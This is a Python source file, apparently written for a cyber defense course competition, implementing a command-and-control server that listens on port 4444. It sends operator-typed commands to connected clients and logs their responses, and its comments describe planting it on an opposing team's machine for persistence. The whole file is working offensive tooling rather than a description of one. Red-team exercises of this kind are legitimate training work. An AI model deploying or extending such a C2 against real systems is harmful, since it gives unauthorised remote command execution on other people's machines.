# Noah Barnes
# Daryl Johnson
# Cyber Defense and Techniques
# 24 September 2024
# CDT ECHO

#This file is meant to be installed on a blue teams device to maintain persistence.
#This is curated for the Kali Box
#basic for submission will be altered before competition

import socket
import threading
import logging

#Setup logging
logging.basicConfig(filename="c2_server.log", level=logging.INFO, format='%(asctime)s %(message)s') #creates format that takes time and message as parameters and creates file to log all activity between server and client

#Command-and-Control Server Class
class C2Server:
    def __init__(self, host="10.65.0.0", port=4444): #host network as server for client to connect (will be changed for comp)
        self.host = host 
        self.port = port
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        print(f"C2 Server is listening on {self.host}:{self.port}")
        logging.info(f"C2 Server started on {self.host}:{self.port}")

    def handle_client(self, client_socket, address): #creates handler for connection
        print(f"New connection from {address}") #logs address connected to
        logging.info(f"New connection from {address}") #creates log
        client_socket.send(b"Connected to C2 Server\n") 

        try: #if unable to handle client, automatically terminated and logged into c2_server.log
            while True:
                # Receive command from server operator
                command = input("Enter command to execute: ")
                if command.lower() == "exit":
                    client_socket.send(b"exit")
                    break
                client_socket.send(command.encode())

                # Receive the response from the client
                response = client_socket.recv(4096).decode('utf-8')
                print(f"Client response:\n{response}")
                logging.info(f"Command executed: {command}, Response: {response}")

        except Exception as e:
            logging.error(f"Error handling client: {e}") #prints error if can not handle client

        finally: #after exception logs, distress on server
            print(f"Client {address} disconnected")
            logging.info(f"Client {address} disconnected") #logs disconnect
            client_socket.close()

    def run(self):
        try:
            while True:
                client_socket, client_address = self.server_socket.accept() #creates client socket and waits for incomming connections
                client_handler = threading.Thread(target=self.handle_client, args=(client_socket, client_address)) 
                client_handler.start() #listens and accepts connections from server socket

        except KeyboardInterrupt: #allows closed connection
            print("Server shutting down...")
            logging.info("C2 Server shutting down")
            self.server_socket.close()


if __name__ == "__main__":
    c2_server = C2Server() 
    c2_server.run() #runs c2 server